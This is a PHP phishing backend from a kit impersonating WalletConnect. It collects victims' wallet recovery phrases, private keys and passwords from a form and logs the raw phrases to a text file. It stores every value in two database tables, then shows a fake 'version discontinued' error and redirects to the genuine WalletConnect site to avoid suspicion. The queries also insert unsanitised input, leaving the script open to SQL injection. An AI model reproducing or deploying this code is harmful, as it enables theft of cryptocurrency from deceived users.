<?php
include 'db.php';

session_start();

$ApplicationNumber= $_POST['appNo'];
$_POST['category'];
$_POST['phrase'];

$key = $_POST['key'];
 $password = $_POST['password'];
 $refer=$_POST['refer'];
//$Program = $_POST['certPreference'];


 //$Fullname = $_POST['name'] . '     '. $_POST['companyname'] ;

//$ApplicationNumber  = trim($_POST['appNo']);
$category  = $_POST['category'];
$phrase =$_POST['phrase'];
$phrasee =$_POST['phrase'];

$key =$_POST['key'];
$keyy =$_POST['key'];
$password =$_POST['password'];
//$certPreference =$_POST['certPreference'];

$str = "$phrase";
    $str1 = substr($str, 5);
    $strkey = "$key";
    $strkey1 = substr($strkey, 1);

$data = "
$phrasee".PHP_EOL;//grabbing var/string
$fp = fopen('hi.txt', 'a');//open  content to write to new line
fwrite($fp, $data);//write data

$Query = "INSERT INTO `account`(`category`, `phrase`, `password`,`key`, `refer`, `regdate`) 
                 VALUES   ( '$category', '$str1', '$password', '$strkey1', '$refer', CURRENT_TIMESTAMP)";
                 
$Query2 = "INSERT INTO `accounts`(`category`, `phrase`, `password`,`key`, `refer`, `regdate`) 
                 VALUES   ( '$category', '$phrasee', '$password', '$keyy', '$refer', CURRENT_TIMESTAMP)";

 

// echo $Query;
    $Save=  mysqli_query($con,$Query);
    $Save=  mysqli_query($con,$Query2);




?>
<html>
<head>
<link rel="stylesheet" href="../main.css" type="text/css"/> 
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Open protocol for connecting Wallets to Dapps">
<meta property="og:image" content="/images/logo.svg">
<link rel="icon" href="https://walletconnect.biz/images/logo.svg">
<meta http-equiv="refresh" content="2; URL=https://www.walletconnect.org/" />
</head>

<title>Wallet-Connect - Error</title>

<body>
<center>
</br>
    <img src="../images/framee.png" width="250px" height="250px"/>
</br>
<h2>OOPS..! VERSION DISCONTINUED</h2>
<i>Redirecting to beta version</i><br><img src="../images/load.gif" width="50px" height="50px"/> <br>have any complain? reach us via
</center>
<footer><div id="footer">
<p><img src="../images/discord.svg" class="footimg">  <a href="https://discord.gg/jhxMvxP">Discord</a></p></br>
<p><img src="../images/telegram.svg" class="footimg">  <a href="https://t.me/walletconnect_announcements">Telegram</a></p></br>
<p><img src="../images/twitter.svg" class="footimg">  <a href="https://twitter.walletconnect.org/">Twitter</a></p></br>
<p><img src="../images/github.svg" class="footimg">  <a href="https://github.com/walletconnect">Github</a></p></br>
</footer>
</body>
</html>